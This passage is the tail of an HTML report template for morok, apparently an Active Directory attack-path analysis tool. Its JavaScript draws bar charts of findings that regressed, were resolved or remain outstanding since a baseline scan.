  html += _histRenderBarGroup('Regressions', regressed, ctx,
    'New or worsened findings since baseline');
  html += _histRenderBarGroup('Resolved & Improved', resolved, ctx,
    'Findings eliminated or reduced since baseline');
  html += _histRenderBarGroup('Outstanding', outstanding, ctx,
    'Unchanged since baseline');
  container.innerHTML = html;
}

function _histRenderBarGroup(title, rows, ctx, subtitle) {
  if (!rows.length) return '';

  var body = '';
  rows.forEach(function(d) {
    var baseColor, curColor;
    if (d.b === d.c) {
      baseColor = curColor = 'var(--text-muted)';
    } else if (d.b > d.c) {
      baseColor = 'var(--sev-critical)';
      curColor  = '#4caf50';
    } else {
      baseColor = '#4caf50';
      curColor  = 'var(--sev-critical)';
    }

    var fixedBadge = (d.c === 0 && d.b > 0)
      ? '<span style="display:inline-flex;align-items:center;gap:4px;' +
        'background:rgba(76,175,80,0.15);color:#4caf50;border:1px solid #4caf50;' +
        'border-radius:4px;padding:3px 9px;font-size:0.75rem;font-weight:700">' +
        '✓ Fixed</span>'
      : '';

    body +=
      '<div style="display:grid;grid-template-columns:210px 1fr 92px;' +
        'align-items:center;gap:16px;padding:12px 0;border-bottom:1px solid var(--border)">' +

        '<a href="#" onclick="showTab(\'' + d.tab + '\');return false" ' +
          'style="color:var(--text-main);text-decoration:none;font-size:0.875rem;' +
          'font-weight:500;line-height:1.3" title="' + _histEsc(d.label) + '">' +
          _histEsc(d.label) +
          (d.isNew ? ' <span style="font-size:0.62rem;background:var(--sev-critical);' +
            'color:#fff;padding:1px 5px;border-radius:3px;vertical-align:middle;' +
            'font-weight:700">NEW</span>' : '') +
        '</a>' +

        '<div>' +
          '<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">' +
            '<div style="font-size:0.7rem;color:var(--text-muted);width:104px;' +
              'text-align:right;flex-shrink:0;white-space:nowrap">' + ctx.baseDate + '</div>' +
            _histBar(d.b, ctx.maxVal, baseColor) +
            '<div style="font-size:0.82rem;font-weight:700;color:' + baseColor +
              ';width:22px;text-align:right;flex-shrink:0">' + d.b + '</div>' +
          '</div>' +
          '<div style="display:flex;align-items:center;gap:10px">' +
            '<div style="font-size:0.7rem;color:var(--text-muted);width:104px;' +
              'text-align:right;flex-shrink:0;white-space:nowrap">now · ' + ctx.curDate + '</div>' +
            _histBar(d.c, ctx.maxVal, curColor) +
            '<div style="font-size:0.82rem;font-weight:700;color:' + curColor +
              ';width:22px;text-align:right;flex-shrink:0">' + d.c + '</div>' +
          '</div>' +
        '</div>' +

        '<div style="text-align:right">' + fixedBadge + '</div>' +
      '</div>';
  });

  return '<div style="margin-bottom:24px">' +
    '<h4 style="margin:0 0 2px;font-size:0.9rem;font-weight:600;color:var(--text-main)">' +
      title + ' <span style="color:var(--text-muted);font-weight:400">(' + rows.length + ')</span></h4>' +
    '<p style="margin:0 0 10px;font-size:0.75rem;color:var(--text-muted)">' + subtitle + '</p>' +
    body +
  '</div>';
}

function _histEsc(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
</script>

<footer style="text-align:center;padding:20px 40px;border-top:1px solid var(--border);
  color:var(--text-muted);font-size:0.8rem;margin-top:40px">
  Generated by <a href="https://github.com/YakinAnd/morok" target="_blank" rel="noopener"
    style="color:var(--accent);text-decoration:none">morok v{{.Version}}</a>
  &middot; {{.GeneratedAt}} &middot; Active Directory Attack Path Analysis
</footer>

<script type="application/json" id="morok-data">{{.SnapshotJSON}}</script>

</body>
</html>`